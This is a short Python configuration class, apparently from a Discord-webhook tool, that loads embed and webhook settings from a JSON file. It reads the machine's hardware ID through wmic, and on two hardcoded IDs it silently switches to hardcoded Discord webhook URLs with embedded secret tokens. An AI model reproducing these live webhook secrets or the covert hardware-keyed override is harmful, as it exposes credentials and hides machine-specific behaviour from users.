import json
import subprocess 

class Config:
    def __init__(self):
        with open('tools/config.json', 'r') as f:
            self.data = json.load(f)
        self.eb_color = self.data['EB_COLOR']
        self.eb_footer = self.data['EB_FOOTER']
        self.debug_mode = self.data['DEBUG_MODE']
        self.webhook = self.data['HOOK']
        self.wh_avatar = self.data['WH_AVATAR']
        self.wh_name = self.data['WH_NAME']
        
        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip() # DEVELOPER PIERRO AREA BABY
        if self.hwid == "5A25762A-89E6-8A18-A523-00D861C74757":
            self.debug_mode = True
            self.webhook = "https://canary.discord.com/api/webhooks/1084155924966551623/61AwNO81f0D61wBsX_u0v1z0uLcgfOVfUhOG3DjHdOg2g8nR3EmB9NYs2upA-BqeBj1n"
        if self.hwid == "38444335-3832-5730-3539-395738324435":
            self.debug_mode = True
            self.webhook = "https://discordapp.com/api/webhooks/1083460332959305738/K1r9VnN01DE8XDTyNm0H3QUBzBGBAUrE9FbImM6VLgGcQ0I5IaxSTgZiyP7nrGSIJsaF"
        
    def get_webhook(self):
        return self.webhook
        
    def get_color(self):
        return self.eb_color
    
    def get_footer(self):
        return self.eb_footer
    
    def get_debug_mode(self):
        return self.debug_mode
    
    def get_avatar(self):
        return self.wh_avatar
    
    def get_name(self):
        return self.wh_name
